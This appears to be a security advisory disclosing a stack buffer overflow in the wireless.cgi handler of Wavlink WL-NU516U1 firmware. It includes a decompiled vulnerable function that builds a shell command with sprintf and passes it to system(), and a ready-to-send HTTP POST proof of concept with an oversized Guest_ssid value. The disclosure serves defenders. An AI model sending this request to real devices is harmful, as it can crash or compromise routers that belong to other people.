# WL-NU516U1 wireless.cgi GuestWifi Guest_ssid Buffer Overflow

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Buffer Overflow

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a stack-based buffer overflow in /cgi-bin/wireless.cgi.

The vulnerability exists in `sub_407504` (utils.c, `iwpriv_cmd` function):

```c
int sub_407504(const char *a1, const char *a2, const char *a3) {
    char v8[1028];  // stack buffer
    memset(v8, 0, 1024);
    sprintf(v8, "iwpriv %s set %s=\"%s\"", a1, a2, a3);
    // ...
    system(v8);
}
```

The format string `"iwpriv %s set %s=\"%s\""` is 22 characters. When `strlen(a1) + strlen(a2) + strlen(a3) + 22 > 1028`, the sprintf overflows the stack buffer `v8`.

The `Guest_ssid` parameter (variable `v15` in `sub_4032E4`) is passed as `a3` to this function. A POST body with `Guest_ssid` containing ~1000+ bytes of data overwrites the stack return address.

The target architecture is MIPS (little-endian), which may allow RCE by controlling the $ra register.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 1120

page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_ssid=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
